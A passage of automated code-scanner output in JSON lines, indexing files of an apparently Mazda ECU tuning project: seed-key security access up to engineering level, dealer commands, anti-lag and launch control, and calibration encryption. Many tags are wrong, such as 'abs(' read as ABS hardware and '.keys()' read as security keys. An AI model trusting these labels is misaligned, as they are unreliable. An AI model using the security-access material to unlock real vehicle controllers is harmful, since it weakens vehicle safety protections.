"hardware", "line": 112, "hardware": "ECU", "content": "current_level_num = self.security_levels[self.current_security_level]['level']"}, {"type": "hardware", "line": 113, "hardware": "ECU", "content": "requested_level_num = self.security_levels[access_level]['level']"}, {"type": "hardware", "line": 119, "hardware": "ECU", "content": "success = self._execute_security_sequence(access_level)"}, {"type": "hardware", "line": 122, "hardware": "ECU", "content": "self.current_security_level = access_level"}, {"type": "hardware", "line": 124, "hardware": "ECU", "content": "logger.info(f\"Security access granted: {access_level}\")"}, {"type": "hardware", "line": 125, "hardware": "ECU", "content": "return f\"Security access granted: {access_level}\""}, {"type": "hardware", "line": 127, "hardware": "ECU", "content": "logger.warning(f\"Security access failed: {access_level}\")"}, {"type": "hardware", "line": 128, "hardware": "ECU", "content": "return f\"Security access denied: {access_level}\""}, {"type": "hardware", "line": 131, "hardware": "ECU", "content": "logger.error(f\"Security access error: {e}\")"}, {"type": "hardware", "line": 132, "hardware": "ECU", "content": "return f\"Security access error: {e}\""}, {"type": "hardware", "line": 134, "hardware": "ECU", "content": "def _execute_security_sequence(self, access_level: str) -> bool:"}, {"type": "hardware", "line": 136, "hardware": "ECU", "content": "Execute the actual security access sequence"}, {"type": "hardware", "line": 137, "hardware": "ECU", "content": "In real implementation, this would communicate with ECU"}, {"type": "hardware", "line": 140, "hardware": "ECU", "content": "requested_level_num = self.security_levels.get(access_level, {}).get('level', 1)"}, {"type": "hardware", "line": 148, "hardware": "ECU", "content": "ecu_info = self.seed_key_db.ecu_database.get(MazdaECUType.ENGINE_ECU)"}, {"type": "hardware", "line": 149, "hardware": "ECU", "content": "if ecu_info:"}, {"type": "hardware", "line": 150, "hardware": "ECU", "content": "random_seed = secrets.token_bytes(ecu_info['seed_length'])"}, {"type": "hardware", "line": 153, "hardware": "ECU", "content": "ecu_info['algorithm'],"}, {"type": "hardware", "line": 154, "hardware": "vehicle", "content": "vin=self.vehicle_vin,"}, {"type": "hardware", "line": 155, "hardware": "ECU", "content": "security_level=requested_level_num"}, {"type": "hardware", "line": 159, "hardware": "ECU", "content": "self.security_keys[access_level] = key"}, {"type": "hardware", "line": 160, "hardware": "ECU", "content": "self.current_security_key = key"}, {"type": "hardware", "line": 161, "hardware": "ECU", "content": "logger.debug(f\"Derived security key for {access_level} access: {key.hex().upper()}\")"}, {"type": "hardware", "line": 173, "hardware": "ECU", "content": "time.sleep(0.5)  # Simulate ECU response time"}, {"type": "hardware", "line": 179, "hardware": "ECU", "content": "logger.error(f\"Security sequence error: {e}\")"}, {"type": "hardware", "line": 182, "hardware": "ECU", "content": "def execute_dealer_command(self, command: str, parameters: Dict = None) -> Dict:"}, {"type": "hardware", "line": 184, "hardware": "ECU", "content": "Execute dealer-level diagnostic command"}, {"type": "hardware", "line": 187, "hardware": "ECU", "content": "if self.current_security_level == 'user':"}, {"type": "hardware", "line": 203, "hardware": "ECU", "content": "logger.info(f\"Dealer command executed: {command}\")"}, {"type": "hardware", "line": 213, "hardware": "ECU", "content": "Clear all ECU adaptations (fuel trims, VVT learning, etc.)"}, {"type": "hardware", "line": 233, "hardware": "ECU", "content": "'message': 'All ECU adaptations cleared successfully'"}, {"type": "hardware", "line": 241, "hardware": "ECU", "content": "Reset ECU to factory calibration"}, {"type": "hardware", "line": 244, "hardware": "ECU", "content": "if self.current_security_level != 'manufacturer':"}, {"type": "hardware", "line": 253, "hardware": "ECU", "content": "'message': 'ECU reset to factory calibration'"}, {"type": "hardware", "line": 264, "hardware": "ECU", "content": "if self.current_security_level != 'engineering':"}, {"type": "hardware", "line": 289, "hardware": "ECU", "content": "Enable engineering mode with full ECU access"}, {"type": "hardware", "line": 292, "hardware": "ECU", "content": "if self.current_security_level != 'engineering':"}, {"type": "hardware", "line": 301, "hardware": "ECU", "content": "'capabilities': self.security_levels['engineering']['capabilities'],"}, {"type": "hardware", "line": 313, "hardware": "ECU", "content": "if self.current_security_level not in ['manufacturer', 'engineering']:"}, {"type": "hardware", "line": 344, "hardware": "ECU", "content": "if self.current_security_level not in ['dealer', 'manufacturer', 'engineering']:"}, {"type": "hardware", "line": 375, "hardware": "ECU", "content": "def get_security_status(self) -> Dict:"}, {"type": "hardware", "line": 376, "hardware": "ECU", "content": "\"\"\"Get current security access status\"\"\""}, {"type": "hardware", "line": 378, "hardware": "ECU", "content": "'current_level': self.current_security_level,"}, {"type": "hardware", "line": 380, "hardware": "ECU", "content": "'capabilities': self.security_levels[self.current_security_level]['capabilities'],"}, {"type": "hardware", "line": 386, "hardware": "ECU", "content": "if self.current_security_level == 'user':"}, {"type": "hardware", "line": 397, "hardware": "ECU", "content": "\"\"\"Generate secure session key for dealer operations\"\"\""}], "security_logic": [{"type": "security_pattern", "line": 7, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 15, "pattern": "key", "content": "from muts.security import MazdaECUType, MazdaSeedKeyDatabase"}, {"type": "security_pattern", "line": 15, "pattern": "seed", "content": "from muts.security import MazdaECUType, MazdaSeedKeyDatabase"}, {"type": "security_pattern", "line": 30, "pattern": "key", "content": "self.seed_key_db = MazdaSeedKeyDatabase()"}, {"type": "security_pattern", "line": 30, "pattern": "seed", "content": "self.seed_key_db = MazdaSeedKeyDatabase()"}, {"type": "security_pattern", "line": 31, "pattern": "key", "content": "self.security_keys = {}"}, {"type": "security_pattern", "line": 32, "pattern": "key", "content": "self.current_security_key = None"}, {"type": "security_pattern", "line": 36, "pattern": "password", "content": "\"\"\"Initialize dealer access codes and passwords\"\"\""}, {"type": "security_pattern", "line": 76, "pattern": "security_access", "content": "'security_access': {"}, {"type": "security_pattern", "line": 78, "pattern": "key", "content": "'sequence': [0x01, 0x02],  # Request seed, send key"}, {"type": "security_pattern", "line": 78, "pattern": "seed", "content": "'sequence': [0x01, 0x02],  # Request seed, send key"}, {"type": "security_pattern", "line": 102, "pattern": "security_access", "content": "def perform_security_access(self, access_level: str) -> str:"}, {"type": "security_pattern", "line": 148, "pattern": "key", "content": "ecu_info = self.seed_key_db.ecu_database.get(MazdaECUType.ENGINE_ECU)"}, {"type": "security_pattern", "line": 148, "pattern": "seed", "content": "ecu_info = self.seed_key_db.ecu_database.get(MazdaECUType.ENGINE_ECU)"}, {"type": "security_pattern", "line": 150, "pattern": "seed", "content": "random_seed = secrets.token_bytes(ecu_info['seed_length'])"}, {"type": "security_pattern", "line": 151, "pattern": "key", "content": "key = self.seed_key_db.calculate_key("}, {"type": "security_pattern", "line": 151, "pattern": "seed", "content": "key = self.seed_key_db.calculate_key("}, {"type": "security_pattern", "line": 152, "pattern": "seed", "content": "random_seed,"}, {"type": "security_pattern", "line": 153, "pattern": "algorithm", "content": "ecu_info['algorithm'],"}, {"type": "security_pattern", "line": 158, "pattern": "key", "content": "if key:"}, {"type": "security_pattern", "line": 159, "pattern": "key", "content": "self.security_keys[access_level] = key"}, {"type": "security_pattern", "line": 160, "pattern": "key", "content": "self.current_security_key = key"}, {"type": "security_pattern", "line": 161, "pattern": "key", "content": "logger.debug(f\"Derived security key for {access_level} access: {key.hex().upper()}\")"}, {"type": "security_pattern", "line": 347, "pattern": "hash", "content": "required_params = ['calibration_data', 'verification_hash']"}, {"type": "security_pattern", "line": 354, "pattern": "hash", "content": "verification_hash = parameters['verification_hash']"}, {"type": "security_pattern", "line": 357, "pattern": "hash", "content": "data_hash = hashlib.sha256(str(calibration_data).encode()).hexdigest()"}, {"type": "security_pattern", "line": 359, "pattern": "hash", "content": "if data_hash != verification_hash:"}, {"type": "security_pattern", "line": 368, "pattern": "hash", "content": "'verification_hash': data_hash,"}, {"type": "security_pattern", "line": 396, "pattern": "key", "content": "def generate_session_key(self) -> str:"}, {"type": "security_pattern", "line": 397, "pattern": "key", "content": "\"\"\"Generate secure session key for dealer operations\"\"\""}, {"type": "security_pattern", "line": 399, "pattern": "key", "content": "session_key = secrets.token_hex(32)"}, {"type": "security_pattern", "line": 400, "pattern": "key", "content": "return session_key"}, {"type": "security_pattern", "line": 402, "pattern": "key", "content": "def verify_session_integrity(self, session_key: str, data: Dict) -> bool:"}, {"type": "security_pattern", "line": 410, "pattern": "key", "content": "session_key.encode(),"}, {"type": "security_pattern", "line": 412, "pattern": "hash", "content": "hashlib.sha256"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts/services/performance_features.py", "lines_read": 803, "features_found": [{"type": "function", "name": "__init__", "line": 21}, {"type": "function", "name": "calculate_als_parameters", "line": 65}, {"type": "function", "name": "calculate_exhaust_energy_boost", "line": 132}, {"type": "function", "name": "update_turbo_spool_als", "line": 159}, {"type": "function", "name": "safety_monitor", "line": 196}, {"type": "function", "name": "__init__", "line": 251}, {"type": "function", "name": "calculate_rev_limit_parameters", "line": 283}, {"type": "function", "name": "_ignition_cut_strategy", "line": 336}, {"type": "function", "name": "_fuel_cut_strategy", "line": 365}, {"type": "function", "name": "_combined_cut_strategy", "line": 395}, {"type": "function", "name": "calculate_exhaust_pop_effect", "line": 426}, {"type": "function", "name": "__init__", "line": 459}, {"type": "function", "name": "calculate_launch_parameters", "line": 499}, {"type": "function", "name": "_calculate_traction_control", "line": 568}, {"type": "function", "name": "calculate_optimal_shift_points", "line": 611}, {"type": "function", "name": "calculate_launch_timing_advance", "line": 646}, {"type": "function", "name": "__init__", "line": 680}, {"type": "function", "name": "set_performance_mode", "line": 717}, {"type": "function", "name": "calculate_integrated_performance_parameters", "line": 734}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "random", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "logging", "line": null}], "components_found": [{"type": "class", "name": "AntiLagSystem", "line": 15}, {"type": "class", "name": "TwoStepRevLimiter", "line": 245}, {"type": "class", "name": "LaunchControlSystem", "line": 452}, {"type": "class", "name": "AdvancedPerformanceManager", "line": 674}], "algorithms": [{"type": "algorithm_function", "line": 65, "content": "def calculate_als_parameters(self, vehicle_speed: float, throttle_position: float,"}, {"type": "algorithm_function", "line": 132, "content": "def calculate_exhaust_energy_boost(self, current_exhaust_energy: float,"}, {"type": "algorithm_function", "line": 283, "content": "def calculate_rev_limit_parameters(self, engine_rpm: float, vehicle_speed: float,"}, {"type": "algorithm_function", "line": 426, "content": "def calculate_exhaust_pop_effect(self, cut_parameters: Dict, exhaust_temp: float) -> float:"}, {"type": "algorithm_function", "line": 499, "content": "def calculate_launch_parameters(self, vehicle_speed: float, engine_rpm: float,"}, {"type": "algorithm_function", "line": 568, "content": "def _calculate_traction_control(self, wheel_speeds: List[float],"}, {"type": "algorithm_function", "line": 611, "content": "def calculate_optimal_shift_points(self, current_gear: int, engine_rpm: float,"}, {"type": "algorithm_function", "line": 646, "content": "def calculate_launch_timing_advance(self, current_rpm: float, current_boost: float,"}, {"type": "algorithm_function", "line": 734, "content": "def calculate_integrated_performance_parameters(self, sensor_data: Dict) -> Dict:"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 65, "hardware": "vehicle", "content": "def calculate_als_parameters(self, vehicle_speed: float, throttle_position: float,"}, {"type": "hardware", "line": 79, "hardware": "vehicle", "content": "vehicle_speed >= mode_params['activation_speed'] and"}, {"type": "hardware", "line": 99, "hardware": "vehicle", "content": "vehicle_speed < mode_params['activation_speed'] - 10  # Too slow"}, {"type": "hardware", "line": 197, "hardware": "vehicle", "content": "engine_rpm: float, vehicle_speed: float) -> Dict:"}, {"type": "hardware", "line": 255, "hardware": "ABS", "content": "self.hard_redline = 7200  # Absolute fuel cut"}, {"type": "hardware", "line": 283, "hardware": "vehicle", "content": "def calculate_rev_limit_parameters(self, engine_rpm: float, vehicle_speed: float,"}, {"type": "hardware", "line": 301, "hardware": "vehicle", "content": "vehicle_speed < 5.0 and  # Stationary or very slow"}, {"type": "hardware", "line": 316, "hardware": "vehicle", "content": "elif self.launch_active and vehicle_speed > 10.0:"}, {"type": "hardware", "line": 441, "hardware": "ABS", "content": "ignition_retard = abs(cut_parameters.get('ignition_retard', 0.0))"}, {"type": "hardware", "line": 499, "hardware": "vehicle", "content": "def calculate_launch_parameters(self, vehicle_speed: float, engine_rpm: float,"}, {"type": "hardware", "line": 518, "hardware": "vehicle", "content": "vehicle_speed < 2.0 and  # Essentially stationary"}, {"type": "hardware", "line": 559, "hardware": "vehicle", "content": "if vehicle_speed > 20.0:  # Launch complete"}, {"type": "hardware", "line": 612, "hardware": "vehicle", "content": "vehicle_speed: float, throttle_position: float) -> Dict:"}, {"type": "hardware", "line": 739, "hardware": "vehicle", "content": "vehicle_speed = sensor_data.get('vehicle_speed', 0.0)"}, {"type": "hardware", "line": 753, "hardware": "vehicle", "content": "vehicle_speed, throttle_position, turbo_rpm, exhaust_temp"}, {"type": "hardware", "line": 757, "hardware": "vehicle", "content": "engine_rpm, vehicle_speed, clutch_position, throttle_position"}, {"type": "hardware", "line": 761, "hardware": "vehicle", "content": "vehicle_speed, engine_rpm, throttle_position, clutch_position,"}, {"type": "hardware", "line": 766, "hardware": "vehicle", "content": "current_gear, engine_rpm, vehicle_speed, throttle_position"}, {"type": "hardware", "line": 771, "hardware": "vehicle", "content": "exhaust_temp, coolant_temp, engine_rpm, vehicle_speed"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts/services/physics_engine.py", "lines_read": 322, "features_found": [{"type": "function", "name": "__init__", "line": 14}, {"type": "function", "name": "_create_ve_table", "line": 44}, {"type": "function", "name": "calculate_airflow", "line": 67}, {"type": "function", "name": "calculate_turbo_spool", "line": 100}, {"type": "function", "name": "calculate_compressor_efficiency", "line": 135}, {"type": "function", "name": "__init__", "line": 164}, {"type": "function", "name": "_calculate_fmep_curve", "line": 175}, {"type": "function", "name": "calculate_brake_torque", "line": 188}, {"type": "function", "name": "calculate_indicated_power", "line": 205}, {"type": "function", "name": "_timing_efficiency_factor", "line": 234}, {"type": "function", "name": "calculate_exhaust_temperature", "line": 247}, {"type": "function", "name": "__init__", "line": 276}, {"type": "function", "name": "calculate_wheel_torque", "line": 287}, {"type": "function", "name": "calculate_acceleration_force", "line": 296}, {"type": "function", "name": "calculate_theoretical_horsepower", "line": 315}, {"type": "function", "name": "spool_equation", "line": 120}, {"type": "import", "module": "scipy", "line": null}, {"type": "import", "module": "scipy.optimize", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "integrate", "line": null}, {"type": "import", "module": "minimize", "line": null}, {"type": "import", "module": "math", "line": null}], "components_found": [{"type": "class", "name": "TurbochargerPhysics", "line": 11}, {"type": "class", "name": "EngineThermodynamics", "line": 161}, {"type": "class", "name": "PerformanceCalculator", "line": 273}], "algorithms": [{"type": "algorithm_function", "line": 67, "content": "def calculate_airflow(self, rpm, boost_pressure, intake_temp=25):"}, {"type": "algorithm_function", "line": 100, "content": "def calculate_turbo_spool(self, rpm, throttle_position, exhaust_energy):"}, {"type": "algorithm_function", "line": 135, "content": "def calculate_compressor_efficiency(self, pressure_ratio, mass_flow):"}, {"type": "algorithm_function", "line": 175, "content": "def _calculate_fmep_curve(self):"}, {"type": "algorithm_function", "line": 188, "content": "def calculate_brake_torque(self, indicated_torque, rpm):"}, {"type": "algorithm_function", "line": 205, "content": "def calculate_indicated_power(self, mass_airflow, afr, ignition_timing, compression_ratio=9.5):"}, {"type": "algorithm_function", "line": 247, "content": "def calculate_exhaust_temperature(self, mass_airflow, afr, ignition_timing, boost_pressure):"}, {"type": "algorithm_function", "line": 287, "content": "def calculate_wheel_torque(self, engine_torque, gear):"}, {"type": "algorithm_function", "line": 296, "content": "def calculate_acceleration_force(self, wheel_torque, velocity=0):"}, {"type": "algorithm_function", "line": 315, "content": "def calculate_theoretical_horsepower(self, engine_torque, rpm):"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 156, "hardware": "ABS", "content": "pr_effect = 1.0 - abs(pressure_ratio - 2.2) * 0.1  # Peak at PR=2.2"}, {"type": "hardware", "line": 240, "hardware": "ABS", "content": "timing_difference = abs(ignition_timing - optimal_timing)"}, {"type": "hardware", "line": 274, "hardware": "vehicle", "content": "\"\"\"Complete vehicle performance calculations with real physics\"\"\""}, {"type": "hardware", "line": 277, "hardware": "vehicle", "content": "self.vehicle_specs = {"}, {"type": "hardware", "line": 289, "hardware": "vehicle", "content": "gear_ratio = self.vehicle_specs['gear_ratios'][gear - 1]"}, {"type": "hardware", "line": 290, "hardware": "vehicle", "content": "final_drive = self.vehicle_specs['final_drive_ratio']"}, {"type": "hardware", "line": 291, "hardware": "vehicle", "content": "efficiency = self.vehicle_specs['drivetrain_efficiency']"}, {"type": "hardware", "line": 298, "hardware": "vehicle", "content": "wheel_radius = self.vehicle_specs['tire_radius']"}, {"type": "hardware", "line": 305, "hardware": "vehicle", "content": "drag_force = 0.5 * air_density * self.vehicle_specs['drag_coefficient'] * \\"}, {"type": "hardware", "line": 306, "hardware": "vehicle", "content": "self.vehicle_specs['frontal_area'] * velocity**2"}, {"type": "hardware", "line": 309, "hardware": "vehicle", "content": "rolling_resistance = self.vehicle_specs['curb_weight'] * 9.81 * 0.015"}], "security_logic": [{"type": "security_pattern", "line": 191, "pattern": "key", "content": "rpm_points = list(self.friction_mean_effective_pressure.keys())"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts/utils/__init__.py", "lines_read": 7, "features_found": [{"type": "import", "module": ".calculations", "line": null}, {"type": "import", "module": ".security", "line": null}, {"type": "import", "module": "AdvancedCalculations,", "line": null}, {"type": "import", "module": "SecurityManager", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 6, "hardware": "ECU", "content": "from .security import SecurityManager"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts/utils/calculations.py", "lines_read": 366, "features_found": [{"type": "function", "name": "__init__", "line": 13}, {"type": "function", "name": "_initialize_constants", "line": 16}, {"type": "function", "name": "calculate_brake_horsepower", "line": 28}, {"type": "function", "name": "calculate_engine_torque", "line": 44}, {"type": "function", "name": "calculate_air_fuel_ratio", "line": 62}, {"type": "function", "name": "calculate_boost_pressure", "line": 69}, {"type": "function", "name": "calculate_pressure_ratio", "line": 82}, {"type": "function", "name": "calculate_compressor_outlet_temperature", "line": 94}, {"type": "function", "name": "calculate_turbo_mass_flow", "line": 117}, {"type": "function", "name": "calculate_exhaust_gas_temperature", "line": 140}, {"type": "function", "name": "calculate_volumetric_efficiency", "line": 171}, {"type": "function", "name": "__init__", "line": 209}, {"type": "function", "name": "_initialize_secret_methods", "line": 212}, {"type": "function", "name": "_faster_spool_technique", "line": 237}, {"type": "function", "name": "_vvt_torque_optimization", "line": 266}, {"type": "function", "name": "_ignition_knock_margin", "line": 299}, {"type": "function", "name": "_boost_taper_optimization", "line": 335}, {"type": "function", "name": "apply_tuning_secret", "line": 359}, {"type": "import", "module": "scipy", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "interpolate", "line": null}, {"type": "import", "module": "math", "line": null}], "components_found": [{"type": "class", "name": "AdvancedCalculations", "line": 10}, {"type": "class", "name": "TuningSecrets", "line": 206}], "algorithms": [{"type": "algorithm_function", "line": 28, "content": "def calculate_brake_horsepower(self, engine_torque_nm: float, rpm: float) -> float:"}, {"type": "algorithm_function", "line": 44, "content": "def calculate_engine_torque(self, imep: float, displacement_liters: float, volumetric_efficiency: fl"}, {"type": "algorithm_function", "line": 62, "content": "def calculate_air_fuel_ratio(self, mass_air: float, mass_fuel: float) -> float:"}, {"type": "algorithm_function", "line": 69, "content": "def calculate_boost_pressure(self, pressure_ratio: float, atmospheric_pressure: float = None) -> flo"}, {"type": "algorithm_function", "line": 82, "content": "def calculate_pressure_ratio(self, boost_psi: float, atmospheric_pressure: float = None) -> float:"}, {"type": "algorithm_function", "line": 94, "content": "def calculate_compressor_outlet_temperature(self, inlet_temp: float, pressure_ratio: float,"}, {"type": "algorithm_function", "line": 117, "content": "def calculate_turbo_mass_flow(self, engine_rpm: float, engine_displacement: float, volumetric_effici"}, {"type": "algorithm_function", "line": 140, "content": "def calculate_exhaust_gas_temperature(self, intake_temp: float, pressure_ratio: float, afr: float,"}, {"type": "algorithm_function", "line": 171, "content": "def calculate_volumetric_efficiency(self, engine_rpm: float, intake_runner_length: float,"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 74, "hardware": "ABS", "content": "absolute_pressure = pressure_ratio * atmospheric_pressure"}, {"type": "hardware", "line": 75, "hardware": "ABS", "content": "boost_pressure = absolute_pressure - atmospheric_pressure"}, {"type": "hardware", "line": 88, "hardware": "ABS", "content": "absolute_pressure = atmospheric_pressure + boost_pressure"}, {"type": "hardware", "line": 90, "hardware": "ABS", "content": "pressure_ratio = absolute_pressure / atmospheric_pressure"}, {"type": "hardware", "line": 160, "hardware": "ABS", "content": "timing_error = abs(ignition_timing - optimal_timing)"}], "security_logic": [{"type": "security_pattern", "line": 291, "pattern": "key", "content": "for key in adjustments:"}, {"type": "security_pattern", "line": 292, "pattern": "key", "content": "if 'advance' in key:"}, {"type": "security_pattern", "line": 293, "pattern": "key", "content": "adjustments[key] *= 1.2"}, {"type": "security_pattern", "line": 294, "pattern": "key", "content": "elif 'retard' in key:"}, {"type": "security_pattern", "line": 295, "pattern": "key", "content": "adjustments[key] *= 1.1"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts/utils/security.py", "lines_read": 247, "features_found": [{"type": "function", "name": "__init__", "line": 25}, {"type": "function", "name": "_generate_master_key", "line": 33}, {"type": "function", "name": "_derive_encryption_key", "line": 37}, {"type": "function", "name": "encrypt_calibration_data", "line": 50}, {"type": "function", "name": "decrypt_calibration_data", "line": 77}, {"type": "function", "name": "generate_vehicle_signature", "line": 103}, {"type": "function", "name": "verify_vehicle_signature", "line": 132}, {"type": "function", "name": "protect_ai_model", "line": 163}, {"type": "function", "name": "unprotect_ai_model", "line": 190}, {"type": "function", "name": "secure_communication_channel", "line": 215}, {"type": "import", "module": "cryptography.fernet", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.kdf.pbkdf2", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.ciphers", "line": null}, {"type": "import", "module": "cryptography.hazmat.backends", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "hmac", "line": null}, {"type": "import", "module": "secrets", "line": null}, {"type": "import", "module": "Fernet", "line": null}, {"type": "import", "module": "hashes", "line": null}, {"type": "import", "module": "PBKDF2HMAC", "line": null}, {"type": "import", "module": "Cipher,", "line": null}, {"type": "import", "module": "default_backend", "line": null}, {"type": "import", "module": "base64", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "json", "line": null}], "components_found": [{"type": "class", "name": "SecurityManager", "line": 19}, {"type": "class", "name": "SecurityError", "line": 241}], "algorithms": [{"type": "algorithm_function", "line": 37, "content": "def _derive_encryption_key(self, password: str) -> bytes:"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "ECU", "content": "SECURITY AND ENCRYPTION UTILITIES"}, {"type": "hardware", "line": 19, "hardware": "ECU", "content": "class SecurityManager:"}, {"type": "hardware", "line": 21, "hardware": "ECU", "content": "COMPLETE SECURITY MANAGEMENT FOR TUNING DATA"}, {"type": "hardware", "line": 22, "hardware": "ECU", "content": "Encrypts calibration files, protects AI models, and secures communication"}, {"type": "hardware", "line": 34, "hardware": "ECU", "content": "\"\"\"Generate cryptographically secure master key\"\"\""}, {"type": "hardware", "line": 52, "hardware": "ECU", "content": "Encrypt ECU calibration data for secure storage"}, {"type": "hardware", "line": 75, "hardware": "ECU", "content": "raise SecurityError(f\"Calibration encryption failed: {e}\")"}, {"type": "hardware", "line": 79, "hardware": "ECU", "content": "Decrypt ECU calibration data with integrity verification"}, {"type": "hardware", "line": 93, "hardware": "ECU", "content": "raise SecurityError(\"Data integrity check failed\")"}, {"type": "hardware", "line": 101, "hardware": "ECU", "content": "raise SecurityError(f\"Calibration decryption failed: {e}\")"}, {"type": "hardware", "line": 103, "hardware": "vehicle", "content": "def generate_vehicle_signature(self, vin: str, calibration_id: str) -> str:"}, {"type": "hardware", "line": 105, "hardware": "vehicle", "content": "Generate unique vehicle signature for tuning file validation"}, {"type": "hardware", "line": 106, "hardware": "vehicle", "content": "Prevents tuning files from being used on unauthorized vehicles"}, {"type": "hardware", "line": 130, "hardware": "ECU", "content": "raise SecurityError(f\"Signature generation failed: {e}\")"}, {"type": "hardware", "line": 132, "hardware": "vehicle", "content": "def verify_vehicle_signature(self, signature_data: str, vin: str, calibration_id: str) -> bool:"}, {"type": "hardware", "line": 134, "hardware": "vehicle", "content": "Verify vehicle signature for tuning file authorization"}, {"type": "hardware", "line": 188, "hardware": "ECU", "content": "raise SecurityError(f\"AI model protection failed: {e}\")"}, {"type": "hardware", "line": 213, "hardware": "ECU", "content": "raise SecurityError(f\"AI model unprotection failed: {e}\")"}, {"type": "hardware", "line": 215, "hardware": "ECU", "content": "def secure_communication_channel(self, data: dict, session_key: str) -> str:"}, {"type": "hardware", "line": 217, "hardware": "ECU", "content": "Secure data for transmission over communication channels"}, {"type": "hardware", "line": 230, "hardware": "ECU", "content": "secure_package = {"}, {"type": "hardware", "line": 236, "hardware": "ECU", "content": "return base64.urlsafe_b64encode(json.dumps(secure_package).encode()).decode()"}, {"type": "hardware", "line": 239, "hardware": "ECU", "content": "raise SecurityError(f\"Communication security failed: {e}\")"}, {"type": "hardware", "line": 241, "hardware": "ECU", "content": "class SecurityError(Exception):"}, {"type": "hardware", "line": 242, "hardware": "ECU", "content": "\"\"\"Custom security exception\"\"\""}, {"type": "hardware", "line": 246, "hardware": "ECU", "content": "security_manager = SecurityManager()"}], "security_logic": [{"type": "security_pattern", "line": 2, "pattern": "encrypt", "content": "SECURITY AND ENCRYPTION UTILITIES"}, {"type": "security_pattern", "line": 6, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 10, "pattern": "hash", "content": "from cryptography.hazmat.primitives import hashes"}, {"type": "security_pattern", "line": 12, "pattern": "algorithm", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 12, "pattern": "cipher", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 22, "pattern": "encrypt", "content": "Encrypts calibration files, protects AI models, and secures communication"}, {"type": "security_pattern", "line": 25, "pattern": "key", "content": "def __init__(self, master_key: str = None):"}, {"type": "security_pattern", "line": 26, "pattern": "key", "content": "self.master_key = master_key or self._generate_master_key()"}, {"type": "security_pattern", "line": 27, "pattern": "key", "content": "self.fernet = Fernet(self._derive_encryption_key(self.master_key))"}, {"type": "security_pattern", "line": 27, "pattern": "encrypt", "content": "self.fernet = Fernet(self._derive_encryption_key(self.master_key))"}, {"type": "security_pattern", "line": 30, "pattern": "key", "content": "self.key_derivation_iterations = 100000"}, {"type": "security_pattern", "line": 33, "pattern": "key", "content": "def _generate_master_key(self) -> str:"}, {"type": "security_pattern", "line": 34, "pattern": "key", "content": "\"\"\"Generate cryptographically secure master key\"\"\""}, {"type": "security_pattern", "line": 37, "pattern": "password", "content": "def _derive_encryption_key(self, password: str) -> bytes:"}, {"type": "security_pattern", "line": 37, "pattern": "key", "content": "def _derive_encryption_key(self, password: str) -> bytes:"}, {"type": "security_pattern", "line": 37, "pattern": "encrypt", "content": "def _derive_encryption_key(self, password: str) -> bytes:"}, {"type": "security_pattern", "line": 38, "pattern": "password", "content": "\"\"\"Derive encryption key from password using PBKDF2\"\"\""}, {"type": "security_pattern", "line": 38, "pattern": "key", "content": "\"\"\"Derive encryption key from password using PBKDF2\"\"\""}, {"type": "security_pattern", "line": 38, "pattern": "encrypt", "content": "\"\"\"Derive encryption key from password using PBKDF2\"\"\""}, {"type": "security_pattern", "line": 41, "pattern": "algorithm", "content": "algorithm=hashes.SHA256(),"}, {"type": "security_pattern", "line": 41, "pattern": "hash", "content": "algorithm=hashes.SHA256(),"}, {"type": "security_pattern", "line": 44, "pattern": "key", "content": "iterations=self.key_derivation_iterations,"}, {"type": "security_pattern", "line": 47, "pattern": "password", "content": "key = base64.urlsafe_b64encode(kdf.derive(password.encode()))"}, {"type": "security_pattern", "line": 47, "pattern": "key", "content": "key = base64.urlsafe_b64encode(kdf.derive(password.encode()))"}, {"type": "security_pattern", "line": 48, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 50, "pattern": "encrypt", "content": "def encrypt_calibration_data(self, calibration_data: dict) -> str:"}, {"type": "security_pattern", "line": 52, "pattern": "encrypt", "content": "Encrypt ECU calibration data for secure storage"}, {"type": "security_pattern", "line": 59, "pattern": "encrypt", "content": "encrypted_data = self.fernet.encrypt(data_str.encode())"}, {"type": "security_pattern", "line": 62, "pattern": "hash", "content": "integrity_hash = hashlib.sha256(data_str.encode()).hexdigest()"}, {"type": "security_pattern", "line": 65, "pattern": "encrypt", "content": "encrypted_package = {"}, {"type": "security_pattern", "line": 66, "pattern": "encrypt", "content": "'data': base64.urlsafe_b64encode(encrypted_data).decode(),"}, {"type": "security_pattern", "line": 67, "pattern": "hash", "content": "'integrity_hash': integrity_hash,"}, {"type": "security_pattern", "line": 72, "pattern": "encrypt", "content": "return base64.urlsafe_b64encode(json.dumps(encrypted_package).encode()).decode()"}, {"type": "security_pattern", "line": 75, "pattern": "encrypt", "content": "raise SecurityError(f\"Calibration encryption failed: {e}\")"}, {"type": "security_pattern", "line": 77, "pattern": "encrypt", "content": "def decrypt_calibration_data(self, encrypted_package: 